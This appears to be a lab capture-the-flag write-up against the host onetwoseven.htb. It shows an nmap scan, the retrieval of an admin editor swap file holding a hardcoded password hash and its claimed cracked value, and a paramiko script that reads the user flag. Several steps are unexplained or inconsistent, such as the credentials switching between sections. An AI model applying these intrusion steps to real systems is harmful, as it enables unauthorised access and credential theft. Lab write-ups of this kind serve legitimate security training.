
Target : 10.129.24.245

Date : 03/07/2026

```bash
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.24.245  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-03 19:41 +0200  
Warning: 10.129.24.245 giving up on port because retransmission cap hit (6).  
Nmap scan report for onetwoseven.htb (10.129.24.245)  
Host is up (0.070s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT      STATE    SERVICE VERSION  
22/tcp    open     ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)  
| ssh-hostkey:    
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)  
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)  
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))  
|_http-server-header: Apache/2.4.25 (Debian)  
|_http-title: Page moved.  
60080/tcp filtered unknown  
Device type: general purpose|router  
Running: Linux 5.X, MikroTik RouterOS 7.X  
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3  
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 44.16 seconds
```

We See only ports `ssh 22/tcp` and `80 22/tcp` and a mysterious port `60080/tcp`.

We go to the `signup.php` : `http://onetwoseven.htb/signup.php` and we are granted credentials : 
Username: ots-lYzY1ZGQ
Password: 7bec65dd

That we can use via '`sftp://onetwoseven.htb`'

As well as our "personal page" at `http://onetwoseven.htb/~ots-lYzY1ZGQ/`.

We didn't see any `sftp` port on the fullport scan but we'll try anyways :

```bash
>  sftp ots-lYzY1ZGQ@onetwoseven.htb  
ots-lYzY1ZGQ@onetwoseven.htb's password:    
Connected to onetwoseven.htb.  
sftp> ls  
public_html
```

And it works.

We get `http://onetwoseven.htb/~ots-lYzY1ZGQ/root/var/www/html-admin/.login.php.swp` and use `strings` to `grep` any credentials :

```bash
>  strings /tmp/onetwoseven/.login.php.swp | grep -E 'sha256|password|ots-admin|admin' | head -20  
/var/www/html-admin/login.php  
             if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {  
           if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {  
           <p>Administration backend. For administrators only.</p>  
             <tr><td><b>Password:</b></td><td><input type="password" name="password" size="40" required></td></tr>  
                 $msg = 'Wrong username or password.';  
                 $_SESSION['username'] = 'ots-admin';
```

From the hash, we get `Homesweethome1`

We grab the user flag with `localhost SFTP` :

```bash
`python3 << 'PY' import paramiko host = "10.129.24.245" user = "ots-yODc2NGQ" pwd = "f528764d" transport = paramiko.Transport((host, 22)) transport.connect(username=user, password=pwd) sftp = paramiko.SFTPClient.from_transport(transport) try: with sftp.open('user.txt') as f: print(f.read().decode()) except Exception as e: print("user.txt error:", e) print("home listing:", sftp.listdir('.')) sftp.close() transport.close() PY`

38eaa7e79a30389051c3aeafd0f5799e
```